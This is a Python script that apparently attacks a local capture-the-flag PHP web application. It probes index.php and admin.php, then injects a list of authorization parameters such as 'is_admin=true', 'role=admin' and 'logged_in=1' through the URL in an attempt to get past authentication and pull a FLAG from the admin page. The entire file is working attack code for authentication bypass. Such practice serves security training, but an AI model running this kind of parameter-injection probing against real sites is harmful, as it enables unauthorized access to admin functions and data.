import requests
import re
from urllib.parse import urlencode

# Configuration
base_url = "http://127.0.0.1:33107"
cookies = {'PHPSESSID': '0f096ce270c90d28140b4eb5f93213a2'}

# First, verify endpoints exist
print("[+] Verifying endpoints exist...")

# Test /index.php with category parameter (no auth first)
index_test = f"{base_url}/index.php?category=secret"
try:
    resp = requests.get(index_test, cookies=cookies, allow_redirects=True, timeout=10)
    print(f"[+] index.php status: {resp.status_code} | length: {len(resp.content)}B")
    print(f"[+] index.php cookies: {dict(resp.cookies)}")
except Exception as e:
    print(f"[!] index.php error: {e}")

print("-" * 60)

# Test /admin.php directly
admin_url = f"{base_url}/admin.php"
try:
    resp = requests.get(admin_url, cookies=cookies, allow_redirects=True, timeout=10)
    print(f"[+] admin.php direct access status: {resp.status_code} | length: {len(resp.content)}B")
    
    # Check for login forms or admin content
    if "login" in resp.text.lower():
        print("[!] Login form detected - authentication required")
        
    # Check for flag
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"[!] FLAG FOUND in admin.php: {flag_match.group()}")
    else:
        print("[+] No FLAG in admin.php direct access")
        
    print(f"[+] Response snippet:\n{resp.text[:500] if len(resp.text) > 500 else resp.text}")
    
except Exception as e:
    print(f"[!] admin.php error: {e}")

print("=" * 60)
print("[+] Testing authentication variable injection...")
print("=" * 60)

# Test via category parameter injection (with proper encoding)
test_vars = {
    'admin': '1',
    'is_admin': 'true',
    'role': 'admin',
    'user_type': 'admin',
    'authenticated': '1',
    'authorized': '1',
    'logged_in': '1',
    'privilege': 'admin',
    'access_level': 'admin',
    'permission': 'admin'
}

# Track results
results = []

for var_name, var_value in test_vars.items():
    print(f"\n--- Testing {var_name}={var_value} ---")
    
    # Build injection URL with proper encoding
    params = {'category': 'secret', var_name: var_value}
    inject_url = f"{base_url}/index.php?{urlencode(params)}"
    
    print(f"[+] Injection URL: {inject_url}")
    
    try:
        # Inject via category parameter
        inject_resp = requests.get(inject_url, cookies=cookies, allow_redirects=True, timeout=10)
        print(f"[+] Injection response status: {inject_resp.status_code}")
        
        # Check for cookie changes
        if inject_resp.cookies:
            for name, value in inject_resp.cookies.items():
                print(f"[+] Cookie set: {name}={value}")
                
        # Check response for auth success indicators
        response_text = inject_resp.text
        
        # Check for various admin indicators
        admin_indicators = ['admin panel', 'dashboard', 'welcome admin', 'logged in as admin', 'administrator']
        auth_indicators = ['logged in', 'authentication successful', 'access granted']
        
        found_indicators = []
        for indicator in admin_indicators + auth_indicators:
            if indicator in response_text.lower():
                found_indicators.append(indicator)
                
        if found_indicators:
            print(f"[+] Auth indicators found in injection response: {found_indicators}")
            
        # Now test admin access with potentially modified session
        admin_resp = requests.get(admin_url, cookies=inject_resp.cookies, allow_redirects=True, timeout=10)
        print(f"[+] Admin access after injection: status={admin_resp.status_code}")
        
        # Search for flag in admin response
        flag_match = re.search(r'FLAG\{[^}]+\}', admin_resp.text)
        if flag_match:
            print(f"[!] ** FLAG FOUND **: {flag_match.group()}")
            results.append({
                'variable': var_name,
                'status': 'FLAG_FOUND',
                'flag': flag_match.group()
            })
        elif "login" not in admin_resp.text.lower() and len(admin_resp.text) > 100:
            print("[!] Possible admin access - no login form detected")
            print(f"[+] Admin response length: {len(admin_resp.text)}B")
            print(f"[+] Response snippet: {admin_resp.text[:300]}")
            results.append({
                'variable': var_name,
                'status': 'ACCESS_GRANTED',
                'length': len(admin_resp.text)
            })
        else:
            print(f"[+] Still requires login")
            results.append({
                'variable': var_name,
                'status': 'FAILED'
            })
            
    except Exception as e:
        print(f"[!] Error testing {var_name}: {e}")
        continue

# Final summary
print("\n" + "=" * 60)
print("TEST SUMMARY")
print("=" * 60)

flags_found = [r for r in results if r['status'] == 'FLAG_FOUND']
access_granted = [r for r in results if r['status'] == 'ACCESS_GRANTED']
failed = [r for r in results if r['status'] == 'FAILED']

if flags_found:
    print(f"[+] FLAGS FOUND: {len(flags_found)}")
    for r in flags_found:
        print(f"    - {r['variable']}: {r['flag']}")
        
if access_granted:
    print(f"[+] Admin access granted: {len(access_granted)}")
    for r in access_granted:
        print(f"    - {r['variable']}: {r['length']}B response")
        
if failed:
    print(f"[+] Failed attempts: {len(failed)}")
    print(f"    Variables: {[r['variable'] for r in failed]}")

print(f"\n[+] Total results: {len(results)}")
